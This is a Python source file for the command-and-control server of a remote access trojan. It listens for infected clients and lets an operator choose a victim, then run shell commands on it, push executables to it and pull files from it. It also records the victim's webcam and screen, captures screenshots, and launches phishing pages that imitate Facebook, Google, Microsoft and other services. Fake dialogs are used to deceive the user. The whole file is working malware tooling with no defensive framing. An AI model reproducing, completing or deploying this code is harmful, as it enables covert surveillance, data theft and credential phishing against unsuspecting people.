import os
import socket
import threading
from queue import Queue
import time

# Global variables
active_connections = []
client_addresses = []
command_queue = Queue()

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 9999
server_socket = None
current_target = None


def create_server_socket():
    """Create the server socket"""
    global server_socket
    try:
        server_socket = socket.socket()
        print("Server socket created successfully")
    except socket.error as error:
        print(f"Socket creation error: {error}")


def bind_server_socket():
    """Bind the server socket to host and port"""
    global server_socket
    try:
        print(f"Binding server to {SERVER_HOST}:{SERVER_PORT}")
        server_socket.bind((SERVER_HOST, SERVER_PORT))
        server_socket.listen(5)
        print("Server bind successful - listening for connections")
    except socket.error as error:
        print(f"Socket binding error: {error}")
        time.sleep(5)
        bind_server_socket()  # Retry binding


def accept_client_connections():
    """Accept incoming client connections"""
    while True:
        try:
            connection, address = server_socket.accept()
            connection.setblocking(True)
            active_connections.append(connection)
            client_addresses.append(address)
            print(f"\nConnected to client IP: {address[0]}:{address[1]}")
        except Exception as error:
            print(f"Error accepting connection: {error}")


def start_command_interface():
    """Main command interface for the server"""
    while True:
        try:
            command = input('Session> ')
            
            if command == 'list':
                list_active_connections()
            elif command.startswith('select'):
                connection = get_target_connection(command)
                if connection is not None:
                    handle_target_session(connection)
                else:
                    print("Invalid selection - please try again")
            else:
                print("Unknown command - available commands: 'list', 'select <id>'")
                
        except KeyboardInterrupt:
            print("\nShutting down server...")
            break
        except Exception as error:
            print(f"Command interface error: {error}")


def list_active_connections():
    """List all active client connections"""
    if not active_connections:
        print("No active connections")
        return
        
    print('\n' + '=' * 50)
    print("Active Sessions:")
    print('=' * 50)
    
    for index, connection in enumerate(active_connections):
        ip_address = client_addresses[index][0]
        port = client_addresses[index][1]
        print(f"{index} - IP: {ip_address} | Port: {port}")
    print('=' * 50)


def get_target_connection(command):
    """Get the target connection based on selection"""
    global current_target
    try:
        target_id = int(command.replace('select ', ''))
        
        if 0 <= target_id < len(active_connections):
            current_target = target_id
            connection = active_connections[target_id]
            target_ip = client_addresses[target_id][0]
            print(f"Selected target: {target_ip}")
            return connection
        else:
            print("Invalid connection ID")
            return None
            
    except (ValueError, IndexError) as error:
        print(f"Invalid selection: {error}")
        return None


def handle_target_session(connection):
    """Handle session with selected target"""
    while True:
        try:
            print("\nAvailable Operations:")
            print("1 - Remote Access")
            print("2 - File Transfer")
            print("3 - Record Camera")
            print("4 - Record Screen")
            print("5 - Screenshot")
            print("6 - Social Engineering")
            print("99 - Exit Session")
            
            operation = int(input("Select operation: "))
            
            if operation == 1:
                connection.send(b'1')
                handle_remote_access(connection)
            elif operation == 2:
                connection.send(b'2')
                handle_file_transfer(connection)
            elif operation == 3:
                connection.send(b'3')
                handle_camera_recording(connection)
            elif operation == 4:
                connection.send(b'4')
                handle_screen_recording(connection)
            elif operation == 5:
                connection.send(b'5')
                handle_screenshot_capture(connection)
            elif operation == 6:
                connection.send(b'6')
                handle_social_engineering(connection)
            elif operation == 99:
                connection.send(b'99')
                handle_session_termination(connection)
                return
            else:
                print("Invalid operation - please select 1-6 or 99")
                
        except ValueError:
            print("Please enter a valid number")
        except Exception as error:
            print(f"Session error: {error}")
            break


def handle_remote_access(connection):
    """Handle remote command execution"""
    target_ip = client_addresses[current_target][0]
    
    while True:
        try:
            command = input(f"{target_ip}$ ")
            
            if not command:
                continue
                
            connection.send(command.encode())
            
            if command == 'quit':
                return
            elif command == 'dir':
                # Handle directory listing with timeout
                directory_data = ''
                while True:
                    try:
                        connection.settimeout(3)
                        chunk = connection.recv(99999999).decode(errors='replace')
                        directory_data += chunk
                    except socket.timeout:
                        if directory_data:
                            print(directory_data)
                        break
            else:
                # Handle regular command output
                connection.setblocking(True)
                response = connection.recv(9999999)
                try:
                    print(response.decode())
                except UnicodeDecodeError:
                    print(response)
                    
        except KeyboardInterrupt:
            print("\nExiting remote access...")
            return
        except Exception as error:
            print(f"Remote access error: {error}")
            break


def handle_file_transfer(connection):
    """Handle file upload and download operations"""
    try:
        transfer_type = int(input("1 - Upload to client, 2 - Download from client: "))
        connection.send(str(transfer_type).encode())
        
        if transfer_type == 1:
            upload_file_to_client(connection)
        elif transfer_type == 2:
            download_file_from_client(connection)
        else:
            print("Invalid transfer type")
            
    except ValueError:
        print("Please enter 1 or 2")
    except Exception as error:
        print(f"File transfer error: {error}")


def upload_file_to_client(connection):
    """Upload file to client"""
    try:
        file_extension = input("File extension (e.g., exe, txt, pdf): ")
        connection.send(file_extension.encode())
        
        file_path = input("Local file path to upload: ")
        
        if not os.path.exists(file_path):
            print(f"File not found: {file_path}")
            return
            
        with open(file_path, 'rb') as file:
            file_chunks = file.readlines()
            total_chunks = len(file_chunks)
            print(f"Uploading {total_chunks} chunks...")
            
            for chunk in file_chunks:
                connection.send(chunk)
                total_chunks -= 1
                print(f"Remaining chunks: {total_chunks}")
                
        # Wait for confirmation
        connection.setblocking(True)
        confirmation = connection.recv(1024).decode()
        print(f"Upload status: {confirmation}")
        
    except FileNotFoundError as error:
        print(f"File error: {error}")
    except Exception as error:
        print(f"Upload error: {error}")


def download_file_from_client(connection):
    """Download file from client"""
    try:
        while True:
            file_path = input("Remote file path to download (or 'quit' to exit): ")
            connection.send(file_path.encode())
            
            if file_path == 'quit':
                return
            elif file_path.startswith('cd'):
                # Handle directory change
                response = connection.recv(9999999)
                print(response.decode())
            elif file_path.startswith('dir'):
                # Handle directory listing
                directory_data = ''
                while True:
                    try:
                        connection.settimeout(3)
                        chunk = connection.recv(99999999).decode(errors='replace')
                        directory_data += chunk
                    except socket.timeout:
                        if directory_data:
                            print(directory_data)
                        break
            else:
                # Download file
                download_chunks = 0
                while True:
                    try:
                        connection.settimeout(10)
                        file_data = connection.recv(9999999)
                        
                        if os.path.exists(file_path):
                            with open(file_path, 'ab') as file:
                                file.write(file_data)
                        else:
                            with open(file_path, 'wb') as file:
                                file.write(file_data)
                                print("Starting download...")
                                
                        download_chunks += 1
                        print(f"Downloaded chunks: {download_chunks}")
                        
                    except socket.timeout:
                        print("Download completed or timeout occurred")
                        break
                        
    except Exception as error:
        print(f"Download error: {error}")


def handle_camera_recording(connection):
    """Handle camera recording operation"""
    print("Initiating camera recording...")
    
    try:
        frame_count = input("Number of frames to capture: ")
        connection.send(frame_count.encode())
        
        print("Recording in progress...")
        connection.setblocking(True)
        response = connection.recv(1024).decode()
        print(f"Recording status: {response}")
        
    except Exception as error:
        print(f"Camera recording error: {error}")


def handle_screen_recording(connection):
    """Handle screen recording operation"""
    print("Initiating screen recording...")
    
    try:
        frame_count = input("Number of frames to capture: ")
        connection.send(frame_count.encode())
        
        print("Recording in progress...")
        connection.setblocking(True)
        response = connection.recv(1024).decode()
        print(f"Recording status: {response}")
        
    except Exception as error:
        print(f"Screen recording error: {error}")


def handle_screenshot_capture(connection):
    """Handle screenshot capture operation"""
    print("Initiating screenshot capture...")
    
    try:
        screenshot_count = input("Number of screenshots: ")
        delay_seconds = input("Delay between screenshots (seconds): ")
        
        connection.send(screenshot_count.encode())
        connection.send(delay_seconds.encode())
        
        print("Capture in progress...")
        connection.setblocking(True)
        response = connection.recv(1024).decode()
        print(f"Capture status: {response}")
        
    except Exception as error:
        print(f"Screenshot error: {error}")


def handle_social_engineering(connection):
    """Handle social engineering operations"""
    try:
        attack_type = input("1 - Phishing, 2 - Fake Dialog: ")
        connection.send(attack_type.encode())
        
        if attack_type == '1':
            launch_phishing_attack(connection)
        elif attack_type == '2':
            launch_fake_dialog(connection)
        else:
            print("Invalid attack type")
            
    except Exception as error:
        print(f"Social engineering error: {error}")


def launch_phishing_attack(connection):
    """Launch phishing attack on client"""
    print("\nAvailable Phishing Templates:")
    templates = [
        "1 - Facebook", "2 - GitHub", "3 - Google", "4 - Instagram Followers",
        "5 - Instagram", "6 - LinkedIn", "7 - Microsoft", "8 - Netflix",
        "9 - Pinterest", "10 - ProtonMail", "11 - Snapchat", "12 - Spotify",
        "13 - Twitter", "14 - WordPress", "15 - Yahoo"
    ]
    
    for template in templates:
        print(template)
    
    try:
        template_choice = input("Select template: ")
        connection.send(template_choice.encode())
        print("Phishing attack launched")
    except Exception as error:
        print(f"Phishing error: {error}")


def launch_fake_dialog(connection):
    """Launch fake dialog on client"""
    try:
        dialog_title = input("Dialog title/warning: ")
        dialog_message = input("Dialog message/question: ")
        dialog_type = input("1 - Yes/No, 2 - Text Input: ")
        
        connection.send(dialog_title.encode())
        connection.send(dialog_message.encode())
        connection.send(dialog_type.encode())
        
        print("Fake dialog deployed")
    except Exception as error:
        print(f"Dialog error: {error}")


def handle_session_termination(connection):
    """Handle session termination options"""
    try:
        termination_type = input("1 - Full close, 2 - Run in background: ")
        connection.send(termination_type.encode())
        print("Session termination command sent")
    except Exception as error:
        print(f"Termination error: {error}")


def create_worker_threads():
    """Create worker threads for server operations"""
    for _ in range(2):
        thread = threading.Thread(target=worker)
        thread.daemon = True
        thread.start()


def worker():
    """Worker thread function"""
    while True:
        task = command_queue.get()
        
        if task == 1:
            create_server_socket()
            bind_server_socket()
            accept_client_connections()
        elif task == 2:
            start_command_interface()
            
        command_queue.task_done()


def initialize_server():
    """Initialize and start the server"""
    print("Initializing server...")
    
    # Add tasks to queue
    for task in [1, 2]:
        command_queue.put(task)
    
    command_queue.join()
    print("Server shutdown complete")


if __name__ == "__main__":
    try:
        initialize_server()
    except KeyboardInterrupt:
        print("\nServer interrupted by user")
    except Exception as error:
        print(f"Server fatal error: {error}")